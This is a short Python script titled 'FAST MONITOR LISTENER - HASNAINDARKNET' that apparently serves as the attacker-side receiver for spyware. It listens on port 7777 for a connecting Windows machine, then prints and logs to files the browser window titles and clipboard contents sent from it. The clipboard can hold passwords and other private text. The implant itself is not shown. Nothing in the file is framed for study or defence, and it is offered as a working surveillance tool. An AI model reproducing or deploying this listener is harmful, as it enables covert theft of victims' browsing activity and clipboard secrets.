import socket
import time
import os
from datetime import datetime

def main():
    os.system('clear')
    print("""
╔══════════════════════════════════════════════════════════════╗
║         FAST MONITOR LISTENER - HASNAINDARKNET               ║
║         Browser + Clipboard Monitoring                       ║
╚══════════════════════════════════════════════════════════════╝
    """)
    
    host = '0.0.0.0'
    port = 7777
    
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.bind((host, port))
    server.listen(1)
    
    print(f"[*] Listening on {host}:{port}")
    print("[*] Waiting for Windows...\n")
    
    client, addr = server.accept()
    print(f"[+] Connected from: {addr[0]}")
    print("[+] Monitoring (Browser + Clipboard)...\n")
    print("="*70)
    
    try:
        while True:
            data = client.recv(1024).decode()
            if not data:
                break
            
            timestamp = datetime.now().strftime("%H:%M:%S")
            
            if "[BROWSER]" in data:
                title = data.replace("[BROWSER] ", "")
                print(f"\n[{timestamp}] 🌐 BROWSER:")
                print(f"   📍 {title}")
                print("-"*50)
                
                # Save to file
                with open('browser_history.txt', 'a') as f:
                    f.write(f"[{timestamp}] {title}\n")
                    
            elif "[CLIPBOARD]" in data:
                text = data.replace("[CLIPBOARD] ", "")
                print(f"\n[{timestamp}] 📋 CLIPBOARD:")
                print(f"   📝 {text}")
                print("-"*50)
                
                # Save to file
                with open('clipboard_history.txt', 'a') as f:
                    f.write(f"[{timestamp}] {text}\n")
            
            else:
                print(f"\n[{timestamp}] 📱 {data}")
                
    except KeyboardInterrupt:
        print("\n[!] Shutting down...")
    except Exception as e:
        print(f"Error: {e}")
    
    client.close()
    server.close()

if __name__ == "__main__":
    main()
